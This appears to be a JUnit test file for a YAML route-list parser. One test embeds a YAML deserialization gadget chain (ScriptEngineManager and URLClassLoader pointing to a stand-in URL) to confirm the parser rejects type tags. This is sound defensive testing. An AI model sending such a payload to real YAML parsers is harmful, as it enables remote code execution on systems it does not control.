// Copyright 2026 The Paztport Authors
// SPDX-License-Identifier: Apache-2.0

package org.paztport.policy;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;

import java.nio.charset.StandardCharsets;
import java.util.List;
import org.junit.jupiter.api.Test;

class PathsReaderTest {

    @Test
    void parsesTheRouteListInFileOrder() {
        String yaml = """
                paths:
                  - [gateway, orders, payment]
                  - [gateway, orders]
                  - [gateway, search]
                """;
        List<List<String>> routes = PathsReader.parse(yaml.getBytes(StandardCharsets.UTF_8));

        assertEquals(
                List.of(
                        List.of("gateway", "orders", "payment"),
                        List.of("gateway", "orders"),
                        List.of("gateway", "search")),
                routes);
    }

    @Test
    void failsClosedOnMalformedYaml() {
        assertThrows(IllegalArgumentException.class,
                () -> PathsReader.parse("not: [valid".getBytes(StandardCharsets.UTF_8)));
    }

    @Test
    void failsClosedWhenPathsKeyMissing() {
        assertThrows(IllegalArgumentException.class,
                () -> PathsReader.parse("other: 1\n".getBytes(StandardCharsets.UTF_8)));
    }

    @Test
    void aDuplicateKeyIsMalformed() {
        String yaml = """
                paths:
                  - [gateway, orders]
                paths:
                  - [gateway, search]
                """;
        assertThrows(IllegalArgumentException.class, () -> PathsReader.parse(yaml.getBytes(StandardCharsets.UTF_8)));
    }

    @Test
    void anotherTopLevelKeyIsMalformed() {
        String yaml = """
                paths:
                  - [gateway, orders]
                extra: 1
                """;
        assertThrows(IllegalArgumentException.class, () -> PathsReader.parse(yaml.getBytes(StandardCharsets.UTF_8)));
    }

    @Test
    void aTypeTagIsNotInstantiated() {
        String yaml = """
                paths: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://x"]]]]
                """;
        assertThrows(IllegalArgumentException.class, () -> PathsReader.parse(yaml.getBytes(StandardCharsets.UTF_8)));
    }

    @Test
    void aRouteThatIsNotAListOfStringsIsMalformed() {
        assertThrows(IllegalArgumentException.class,
                () -> PathsReader.parse("paths:\n  - [gateway, 7]\n".getBytes(StandardCharsets.UTF_8)));
        assertThrows(IllegalArgumentException.class,
                () -> PathsReader.parse("paths:\n  - gateway\n".getBytes(StandardCharsets.UTF_8)));
        assertThrows(IllegalArgumentException.class,
                () -> PathsReader.parse("- a\n".getBytes(StandardCharsets.UTF_8)));
    }
}
